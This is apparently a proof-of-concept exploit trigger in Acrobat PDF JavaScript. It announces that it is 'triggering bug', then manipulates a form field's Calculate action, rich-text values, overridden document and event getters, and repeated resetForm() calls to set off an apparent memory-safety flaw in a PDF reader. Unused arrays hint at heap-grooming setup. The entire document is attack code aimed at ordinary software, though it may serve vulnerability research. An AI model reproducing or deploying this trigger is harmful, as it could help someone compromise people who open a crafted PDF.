console.show();

var chunks = [];
var bufs = [];
var arrs = [];

function PropAccClosure(obj, prop) {
    obj = obj;
    prop = prop;
    return function () {
        return obj[prop];
    };
}

console.println("[*] triggering bug...");

var f0 = this.getField("testfield");
f0.richText = true;
f0.setAction("Calculate", "callback0()");

// override popups
try {
    Object.defineProperty(this["Collab"], "defaultStore", { enumerable: false });
} catch (e) {}

var mythis = {};
for (var k in this) {
    if (k == "URL" || k == "bookmarkRoot" || k == "ptrs" || k == "arrs" || k == "bufs") continue;
    mythis[k] = 0;
    mythis.__defineGetter__(k, PropAccClosure(this, k));
}

event.target = mythis;
f0.__defineGetter__("doc", function () {
    return mythis;
});

// trigger bug
try {
    this.resetForm();
} catch (e) {}
try {
    this.resetForm();
} catch (e) {}

function callback0() {
    event.__defineGetter__("target", func_0);
    event.richValue = mythis;
}

function func_0() {
    try {
        Object.defineProperty(f0, "textFont", { value: this });
    } catch (e) {}
}
